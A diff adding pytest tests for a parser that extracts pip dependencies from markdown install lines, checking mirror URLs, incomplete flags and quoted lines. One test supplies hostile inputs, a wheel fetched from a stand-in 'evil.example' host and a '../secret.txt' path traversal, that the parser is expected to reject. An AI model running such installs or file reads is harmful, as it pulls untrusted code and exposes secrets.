@@ -106,6 +106,34 @@ def test_analysis_pip_install_line_is_declarative_only():
     assert any(e['source'] == 'install_example' for e in result['python_evidence'])
 
 
+@pytest.mark.parametrize('prefix,suffix', [('> ', ''), ('> > ', ''), ('> `', '`'), ('`', '`')])
+def test_recommended_quoted_install_preloads_markdownify(prefix, suffix):
+    md='python -m pip install mammoth Pillow\n'+prefix+'python -m pip install mammoth Pillow PyMuPDF openpyxl markdownify'+suffix
+    result=analyze_python_dependencies(md,{})
+    assert result['python_requirements']==['mammoth','markdownify','openpyxl','pillow','pymupdf']
+    assert any(e['requirement']=='markdownify' and e['line']==2 for e in result['python_evidence'])
+
+
+@pytest.mark.parametrize('option', ['-i https://mirror.example/simple',
+    '--index-url https://mirror.example/simple', '--index-url=https://mirror.example/simple',
+    '--extra-index-url https://mirror.example/simple', '--extra-index-url=https://mirror.example/simple'])
+def test_mirror_hints_only_extract_packages_and_never_become_builder_sources(option):
+    result=analyze_python_dependencies('> python -m pip install reportlab '+option,{})
+    assert result['python_requirements']==['reportlab']
+    assert 'mirror.example' not in str(result)
+
+
+@pytest.mark.parametrize('option', ['-i','--index-url','--extra-index-url','--index-url=','--extra-index-url='])
+def test_incomplete_mirror_hint_is_rejected(option):
+    with pytest.raises(ValueError):analyze_python_dependencies('> pip install reportlab '+option,{})
+
+
+def test_quotes_do_not_relax_package_or_requirements_file_validation():
+    for md in ('> pip install pkg @ https://evil.example/pkg.whl', '> pip install -r ../secret.txt'):
+        with pytest.raises(ValueError):analyze_python_dependencies(md,{})
+    assert analyze_python_dependencies('Do not run `pip install markdownify`; this is documentation.',{})['python_requirements']==[]
+
+
 def test_analysis_rejects_oversized_requirements_txt():
     out = io.BytesIO()
     with zipfile.ZipFile(out, 'w') as z:
